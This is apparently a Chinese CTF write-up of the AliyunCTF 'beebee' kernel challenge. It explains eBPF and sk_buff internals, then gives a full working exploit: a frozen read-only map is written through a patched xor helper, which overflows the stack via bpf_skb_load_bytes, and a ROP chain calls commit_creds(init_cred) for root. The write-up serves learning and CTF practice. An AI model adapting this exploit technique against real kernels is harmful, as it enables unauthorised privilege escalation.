---
title: AliyunCTF--beebee
date: 2026-02-07 09:50:00
categories:
  - recurrence
tags:
---

# AliyunCTF--beebee

# 一.背景介绍

### 1.1 题目背景讲解

​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地址进行写。因此接下来我们需要了解一下ebpf的原理。

![1740726989847](images/beebee/1740726989847.jpg)

### 1.2 eBPF的背景知识

#### 1.2.1 eBPF汇编编程

​	eBPF（Extended Berkeley Packet Filter）是一种基于内核虚拟机的可编程技术，允许开发者通过在内核中安全运行**沙盒化程序**动态扩展内核功能，无需修改内核源码。其工作流程分为三个阶段：**程序编写**（可通过底层eBPF汇编指令或C等高级语言实现）、**验证与加载**（内核验证器确保代码安全无风险）、**执行与交互**（JIT编译后挂载至事件钩子，通过映射结构与用户态交互）。其中，eBPF汇编提供对指令级操作的**精细控制**，适合性能优化或特定场景突破；而高级语言（如C）通过编译器自动处理类型与边界检查，显著提升开发效率，更适合构建生产级工具（如网络监控、安全防御），两者在控制粒度与开发成本间形成互补。

​	之后介绍一下对于ebpf中eBPF汇编指令的介绍，eBPF 由 11 个 64 位寄存器、一个程序计数器和一个 512 字节的大 BPF 堆栈空间组成。寄存器被命名为r0- r10。操作模式默认为 64 位。64位的寄存器也可作32 位子寄存器使用，它们只能通过特殊的 ALU（算术逻辑单元）操作访问，使用低32位，高32位使用零填充。

![1740739458259](images/beebee/1740739458259.jpg)

​	具体的指令格式如下：

```cpp
struct bpf_insn {
 __u8 code;  /* opcode */
 __u8 dst_reg:4; /* dest register */
 __u8 src_reg:4; /* source register */
 __s16 off;  /* signed offset */
 __s32 imm;  /* signed immediate constant */
};
```

​	对于函数调用通过BPF_CALL指令调用内核预定义的辅助函数（如map_lookup_elem）或自定义函数（如BPF_FUNC_aliyunctf_xor），参数需按约定存入r1-r5寄存器，代码中通过BPF_RAW_INSN调用辅助函数实现数据查找和加解密操作。

**1.2.2 高级语言实现eBPF编程**

```c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct bpf_sock_addr *ctx) {
    char msg[] = "execve syscall triggered";
    bpf_trace_printk(msg, sizeof(msg));
    return 0;
}
char _license[] SEC("license") = "GPL";
```

​	一个C语言编写的eBPF程序开发流程通常遵循以下步骤（以用户提供的execve跟踪程序为例）：首先需要包含内核头文件（如linux/bpf.h）和辅助函数库（如bpf/bpf_helpers.h），通过SEC()宏定义程序挂载点（示例中为tracepoint/syscalls/sys_enter_execve），并在处理函数中实现核心逻辑——本例使用bpf_trace_printk()向内核调试日志输出触发信息，同时必须声明GPL许可证（char _license[]）以满足内核验证要求。该程序实现了对execve系统调用的动态监控功能，当进程执行新程序时，eBPF程序会被触发并记录事件。除系统调用跟踪外，eBPF还可实现网络包过滤（如XDP程序优化网络转发）、性能分析（通过BPF_PERF_OUTPUT映射实时统计CPU/内存指标）、安全防护（如检测异常进程行为），以及容器环境下的资源监控（通过cgroup挂载点关联容器ID）。开发者还可结合BPF_MAP_TYPE_HASH等数据结构实现更复杂的状态跟踪，或通过kprobe/uprobe挂钩内核/用户空间函数进行深度分析。

### 1.3 sk_buff

​	题目栈溢出主要是通过利用BPF_FUNC_skb_load_bytes函数实现对于传入的skb包的内容转存到某片内存区域，因此我们需要了解一下这里的sk_buff，在linux的网络中有很重要的地位。下图展示了对应sk_buff中的存储数据指针信息。

![1740816536277](images/beebee/1740816536277.jpg)

1. sk_buff结构数据区刚被申请好，此时 head 指针、data 指针、tail 指针都是指向同一个地方。head 指针和 end 指针指向的位置一直都不变，而对于数据的变化和协议信息的添加都是通过 data 指针和 tail 指针的改变来表现的。
2. 开始准备存储应用层下发过来的数据，通过调用函数 skb_reserve() 来使 data 指针和 tail 指针同时向下移动，空出一部分空间来为后期添加协议信息。
3. 开始存储数据了，通过调用函数 skb_put() 来使 tail 指针向下移动空出空间来添加数据，此时 skb->data 和 skb->tail 之间存放的都是数据信息，无协议信息。
4. 这时就开始调用函数 skb_push() 来使 data 指针向上移动，空出空间来添加各层协议信息。直到最后到达二层，添加完帧头然后就开始发包了。

​	因此对于上述来说我们通过伪造对应的data数据段就可以最终复制到我们指定的内存区域，但是在具体操作的时候会发现，在利用BPF_PROG_TYPE_SOCKET_FILTER的eBPF的prog_type时，利用BPF_PROG_TEST_RUN测试运行时的数据复制会在测试数据之前的0xe的大小开始复制，通过上述推测，应当是存储MAC的数据帧头包含源/目的MAC地址和协议类型。此时对应的sk_buff的结构如下：

![1740817850319](images/beebee/1740817850319.jpg)

![1740817881785](images/beebee/1740817881785.jpg)

​	因此通过观察可以发现协议部分一共有0x4e大小的内容，通过test.data_in可以模拟以太网数据包，从data数据前0xe大小的地址开始进行复制内存。

### 1.4 总结

​	自此已经基本了解了eBPF可以实现那些功能并且了解到具体的原理，利用这些背景就可以实现后面的攻击利用了，主要就是通过利用对于只读的map进行写，构造出超出aBPF预期的行为，最终实现越界写，构造栈溢出，最终实现权限提升。

# 二. 漏洞利用

### 2.1 题目环境解析

```shell
qemu-system-x86_64  \
-m 512M  \
-smp 2 \
-kernel bzImage    \
-append "console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0"     \
-initrd rootfs.cpio \
-drive file=./flag,if=virtio,format=raw,readonly=on \
-nographic  \
-net nic,model=e1000 \
-no-reboot \
-monitor /dev/null
```

​	根据上述启动脚本，我们可以看到并没有很多保护，并且也没有kalsr，因此只需要对于基地址进行rop就可以完成整个攻击流程。

### 2.2 初始化设置只读map

​	首先观察漏洞我们可以发现，这里主要是通过对于只读的地址实现写的漏洞，因此最先就是创建一个只读的map，之后利用漏洞函数bpf_aliyunctf_xor，实现对于可读的内存覆盖，首先为了创建一个只读的地址区域，先创建了一个map。

```C
{
    union bpf_attr attr = {};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 1;
    attr.map_flags = BPF_F_RDONLY_PROG;
    array_map_fd = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr)));
}
```

​	之后就是初始化这个map的内容

```C
{
        int key = 0;
        char value[8] = {};
        *(long long*)&value[0] = 1;
        union bpf_attr attr = {};
        attr.map_fd = array_map_fd;
        attr.key = (size_t)&key;
        attr.value = (size_t)&value;
        SYSCHK(syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)));
    }
```

​	之后就是讲这个map设置为只读的map

```C
{
    union bpf_attr attr = {};
    attr.map_fd = array_map_fd;
    SYSCHK(syscall(SYS_bpf, BPF_MAP_FREEZE, &attr, sizeof(attr)));
}
```

​	自此就已经完成了对于创建一个只读的map内存地址区域，之后就是需要利用这个只读的map创建一个非预期的数据内容（超出本身的预期值大小），最终利用这个内容调用bpf_skb_load_bytes函数，就可以实现出栈溢出的攻击。

### 2.3 通过漏洞设置非预期数值实现栈溢出攻击

```C
struct bpf_insn prog[] = {
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   // mov64 r9, r1 (保存上下文指针)
    BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0),// [fp-16]=0 (栈空间预置零)
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // mov64 r2, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -16),// r2 -= 16 (计算map key地址)
    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),// r1 = map_fd (加载BPF map文件描述符)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),// map查找调用
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),// if r0!=0 skip next (校验map查找结果)
    BPF_EXIT_INSN(),                       // exit (查找失败直接退出)[2](@ref)
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   // mov64 r3, r0 (保存查找到的value指针)
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   // mov64 r7, r0 (备份value指针)
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0),// r6 = [r7+0] (加载map存储值)
    BPF_ST_MEM(BPF_W, BPF_REG_10, -0x18, 2025 ^ (0x80)),// [fp-24]=2025^0x80 (异或运算存储)
    BPF_ST_MEM(BPF_W, BPF_REG_10, -0x14, 0),// [fp-20]=0 (栈空间初始化)
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  // mov64 r1, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),// r1 -= 24 (计算异或参数地址)
    BPF_MOV64_IMM(BPF_REG_2, 8),           // mov64 r2, 8 (设置参数长度)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_aliyunctf_xor),// 调用自定义异或函数
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   // mov64 r1, r9 (恢复上下文指针)
    BPF_MOV64_IMM(BPF_REG_2, 0),           // mov64 r2, 0 (设置偏移量)
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  // mov64 r3, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8), // r3 -= 8 (计算存储地址)
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),// r4 = [r7+0] (再次加载map值)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),// 加载数据包字节
    BPF_EXIT_INSN()                        // exit (程序退出)
};
```

​	首先就是利用上述的eBPF的汇编指令就可以实现上述效果，接下来分部进行解释，首先对于第一个指令主要时保存r1寄存器里面的值，由于时利用BPF_PROG_TYPE_SOCKET_FILTER的协议，因此r1中存储的就是后面调用skb_load_bytes需要存储信息的sk_buff结构体指针。

```C
	BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   // mov64 r9, r1 (保存上下文指针)
```

​	之后利用下面这部分代码可以实现对于map_lookup_elem函数找到对应key的value指针，也就是后面希望修改只读区域的指针。

```C
    BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0),// [fp-16]=0 (栈空间预置零)
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // mov64 r2, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -16),// r2 -= 16 (计算map key地址)
    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),// r1 = map_fd (加载BPF map文件描述符)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),// map查找调用
```

​	接下来就是利用漏洞函数aliyunctf_xor实现对于非预期的数值构造，利用刚刚获得到的value指针，我们可以设置值为0x80也就是后面复制skb_load_bytes的字节数，按照可读进行预测，这里应该不会发生改变还是0但是由于存在漏洞导致编程0x80。

```c
	BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   // mov64 r3, r0 (保存查找到的value指针)
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   // mov64 r7, r0 (备份value指针)
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0),// r6 = [r7+0] (加载map存储值)
    BPF_ST_MEM(BPF_W, BPF_REG_10, -0x18, 2025 ^ (0x80)),// [fp-24]=2025^0x80 (异或运算存储)
    BPF_ST_MEM(BPF_W, BPF_REG_10, -0x14, 0),// [fp-20]=0 (栈空间初始化)
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  // mov64 r1, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),// r1 -= 24 (计算异或参数地址)
    BPF_MOV64_IMM(BPF_REG_2, 8),           // mov64 r2, 8 (设置参数长度)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_aliyunctf_xor),// 调用自定义异或函数
```

​	最后就是调用skb_load_bytes把data复制到指定的内存区域，这里指定的地址时rbp - 8的地址，因此我们需要在之前说的MAC帧头0xe的基础上加上0x10大小的数据区域就可以控制最终的返回值，覆盖成commit_creds(init_cred())就可以实现权限提升了。

```C
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   // mov64 r1, r9 (恢复上下文指针)
    BPF_MOV64_IMM(BPF_REG_2, 0),           // mov64 r2, 0 (设置偏移量)
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  // mov64 r3, fp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8), // r3 -= 8 (计算存储地址)
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),// r4 = [r7+0] (再次加载map值)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),// 加载数据包字节
    BPF_EXIT_INSN()                        // exit (程序退出)
```

​	之后就是利用BPF_PROG_TYPE_SOCKET_FILTER进行test run,并且存储好伪造的数据也就是在30（0xe + 0x10）这里，自此就完成了整个攻击的全部流程。

```C
// Load BPF program
    union bpf_attr prog_attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = sizeof(prog) / sizeof(struct bpf_insn),
        .insns = (uint64_t)prog,
        .log_buf = (uint64_t)log_buf,
        .log_size = LOG_BUF_SZ,
        .log_level = 1 | 2,
        .license = (uint64_t)"GPL"
    };
    int prog_fd = SYSCHK(syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr)));

    // Prepare ROP chain
    char data_buf[4096] = {};
    struct __sk_buff md = {};
    size_t* rop_chain = (size_t*)&data_buf[30];
    *rop_chain++ = 0xffffffff8130d3de; // pop rdi; ret
    *rop_chain++ = 0xffffffff82a52fa0; // init_cred
    *rop_chain++ = 0xffffffff810c3c50; // commit_creds
    *rop_chain++ = 0xffffffff8108e620; // vfork

    // Execute BPF program
    union bpf_attr test_run_attr = {
        .test.prog_fd = prog_fd,
        .test.data_size_in = 1024,
        .test.data_in = (uint64_t)data_buf,
        .test.ctx_size_in = sizeof(md),
        .test.ctx_in = (uint64_t)&md
    };
    SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &test_run_attr, sizeof(test_run_attr)));
    close(prog_fd);
```

# 三. 总结

​	本题题目主要是利用了eBPF人造出来的漏洞进行的攻击，通过这个攻击进行学习，可以更加清楚的了解eBPF的原理以及如何利用eBPF的漏洞实现内核态的攻击，希望通过这个漏洞的学习，可以方便我们之后对于内核攻击的深入理解。